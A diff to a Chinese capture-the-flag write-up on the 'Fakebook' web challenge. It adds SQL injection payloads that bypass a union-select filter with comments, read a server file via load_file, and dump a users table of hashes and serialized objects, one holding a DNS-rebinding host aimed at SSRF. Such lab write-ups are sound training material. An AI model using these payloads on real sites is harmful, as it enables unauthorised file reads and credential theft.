@@ -140,6 +140,7 @@ title=12&category=12',content=(select(load_file("/var/www/html/flag_8946e1ff1ee3
 ![](assets/Day%206/file-20251224173652831.png)
 
 # [网鼎杯 2018]Fakebook
+
 dirsearch扫一波：
 ![500](assets/Day%206/file-20251224175237686.png)
 有`robots.txt`去看看。
@@ -196,7 +197,18 @@ class UserInfo
 ![](assets/Day%206/file-20251224180129633.png)我们换成www.baidu.com，访问，确实得到了网页html代码，不过是base64形式：
 ![](assets/Day%206/file-20251224181442629.png)
 这里又想测一下sql注入，测一下，发现居然也存在数字型sql，并且过滤了union select连写，我们试一下注释符，可以绕过
+## 方法一：
 然后直接load_file读文件
 ```http
 ?no=0 unioN/**/ select 1,(select(load_file("/var/www/html/flag.php"))),3,4
 ```
+## 方法二：
+常规注入，最后把表中数据读到：
+```http
+?no=0 unioN/**/ select 1,group_concat(no,'~',username,'~',passwd,'~',data),3,4 from users #
+```
+```sql
+1~admin~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:13;s:4:"blog";s:8:"blog.com";},2~admin1~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin1";s:3:"age";i:13;s:4:"blog";s:9:"baidu.com";},3~admin2~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin2";s:3:"age";i:13;s:4:"blog";s:13:"www.baidu.com";},4~admin4~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin4";s:3:"age";i:13;s:4:"blog";s:26:"7f000001.c0a80001.rbndr.us";},5~admin5~c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec~O:8:"UserInfo":3:{s:4:"name";s:6:"admin5";s:3:"age";i:13;s:4:"blog";s:21:"http://local.test.com";}
+```
+得到这个，就发现`data`字段是序列化存储的；报错也有反序列化失败，那想会不会存在反序列化
+![](assets/Day%206/file-20251224183534546.png)
